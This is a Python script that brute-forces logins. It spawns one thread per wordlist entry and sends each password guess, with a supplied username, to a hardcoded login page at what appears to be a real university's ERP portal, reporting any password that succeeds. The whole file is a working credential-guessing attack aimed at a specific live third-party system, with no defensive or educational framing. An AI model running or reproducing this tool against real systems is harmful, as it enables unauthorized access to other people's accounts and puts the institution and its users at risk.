import requests
import argparse
import threading
import time
from colorama import Fore, Back, Style

parser = argparse.ArgumentParser()
parser.add_argument('--username','-u', type=str, required=True)
parser.add_argument('--wordlist','-w', type=str, required=True)

args = parser.parse_args()

username = args.username
wordlists_path = args.wordlist
url = 'https://erp.gctu.edu.gh/sip/auth/login.php'


def check_password(passwd):
    data = {'username': username, 'password': passwd}
    r = requests.post(url, data=data)
    if r.text == 'ok':
        print("Password found:%s" % (passwd))
    else:
        print("[*]checking %s with username:%s and password:%s" % (url, username, passwd))

start = time.perf_counter()



#reading wordlist file
with open(wordlists_path) as wordlists:
    try:
        threads = []
        for passwd in wordlists.readlines():
            passwd = passwd.strip('\n')
            t = threading.Thread(target=check_password, args=(passwd,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("[+]Quitting... ")



finish = time.perf_counter()
print(f"time taken: {finish - start}")